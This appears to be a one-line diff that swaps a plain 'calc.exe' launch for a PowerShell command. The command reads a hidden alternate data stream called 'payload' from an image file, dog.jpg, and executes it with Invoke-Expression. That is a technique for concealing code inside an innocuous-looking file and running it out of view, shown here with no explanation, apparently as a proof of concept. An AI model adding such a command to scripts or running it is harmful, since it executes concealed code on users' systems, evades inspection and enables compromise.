@@ -1,1 +1,1 @@
-calc.exe
+powershell -c "$opencalc = Get-Content .\dog.jpg -Stream payload; Invoke-Expression $opencalc"
